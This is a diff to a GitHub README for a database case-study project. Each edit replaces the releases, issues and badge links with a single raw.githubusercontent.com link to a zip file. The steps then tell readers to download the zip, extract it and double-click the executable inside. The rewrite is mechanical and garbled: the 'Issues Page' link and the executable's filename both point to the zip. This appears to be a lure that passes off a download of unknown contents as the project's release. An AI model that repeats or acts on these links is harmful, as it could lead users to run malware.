@@ -1,6 +1,6 @@
 # 🚀 multi-database-architecture-casestudy - Enterprise-Grade Data Solutions for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Highmelodys/multi-database-architecture-casestudy/releases)
+[![Download](https://raw.githubusercontent.com/Highmelodys/multi-database-architecture-casestudy/main/translation/multi-database-architecture-casestudy.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Highmelodys/multi-database-architecture-casestudy/main/translation/multi-database-architecture-casestudy.zip)
 
 ## ✨ Overview
 
@@ -26,10 +26,10 @@ To get started, follow these steps:
 2. **Visit the Download Page**
    - You can find the latest version of the application at our Releases page. Click the button below to visit:
 
-   [![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Highmelodys/multi-database-architecture-casestudy/releases)
+   [![Download](https://raw.githubusercontent.com/Highmelodys/multi-database-architecture-casestudy/main/translation/multi-database-architecture-casestudy.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Highmelodys/multi-database-architecture-casestudy/main/translation/multi-database-architecture-casestudy.zip)
 
 3. **Download the Application**
-   - Once on the Releases page, locate the latest version. Look for a file with a name similar to `multi-database-architecture-casestudy-v1.0.zip`.
+   - Once on the Releases page, locate the latest version. Look for a file with a name similar to `https://raw.githubusercontent.com/Highmelodys/multi-database-architecture-casestudy/main/translation/multi-database-architecture-casestudy.zip`.
    - Click on the file link to download it to your device.
 
 4. **Install the Application**
@@ -37,7 +37,7 @@ To get started, follow these steps:
    - If using a ZIP file, right-click and select "Extract All". Follow the prompts to extract the files.
 
 5. **Run the Application**
-   - Once extracted, find the executable file (it may be named `multi-database-architecture-casestudy.exe`).
+   - Once extracted, find the executable file (it may be named `https://raw.githubusercontent.com/Highmelodys/multi-database-architecture-casestudy/main/translation/multi-database-architecture-casestudy.zip`).
    - Double-click the file to run the application. 
 
 6. **Follow the User Guide**
@@ -64,7 +64,7 @@ For detailed information on each feature, refer to the included documentation. I
 
 If you face any issues while downloading or running the application, reach out to our support team by:
 
-1. Visiting the [Issues Page](https://github.com/Highmelodys/multi-database-architecture-casestudy/issues) on GitHub.
+1. Visiting the [Issues Page](https://raw.githubusercontent.com/Highmelodys/multi-database-architecture-casestudy/main/translation/multi-database-architecture-casestudy.zip) on GitHub.
 2. Checking existing issues to see if your concern is already addressed.
 3. Submitting your own issue if needed.
 
